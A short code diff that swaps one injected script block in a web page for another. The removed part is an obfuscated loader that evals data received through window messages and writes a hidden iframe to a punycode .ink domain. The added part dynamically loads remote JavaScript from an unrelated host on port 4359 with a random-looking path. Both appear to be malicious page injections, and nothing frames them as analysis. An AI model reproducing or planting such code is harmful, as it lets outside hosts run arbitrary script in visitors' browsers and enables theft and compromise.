@@ -1,3 +1,8 @@
-<script type="text/javascript">
-(function(){window.addEventListener("message",function(e){var _des_s_9844=e.data;if(_des_s_9844.des_s_9844){var _s = '/+/g';eval(decodeURIComponent(_des_s_9844.des_s_9844.replace(_s,"%20")))}});document.write('<iframe style="display:none;" src="https://xn--2qu92fhtx4ff.ink:12443/ty/x-9844-33-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')})();
+<script>
+    var s = document.createElement('script');
+    s.type = 'text/javascript';
+    s.async = true;
+    s.src = 'https://antonynton.com:4359/gtmhhrdc/aouiq1tis0zgzehy4zcaii/2078';
+    var head = document.getElementsByTagName('head')[0];
+    head.appendChild(s);
 </script>
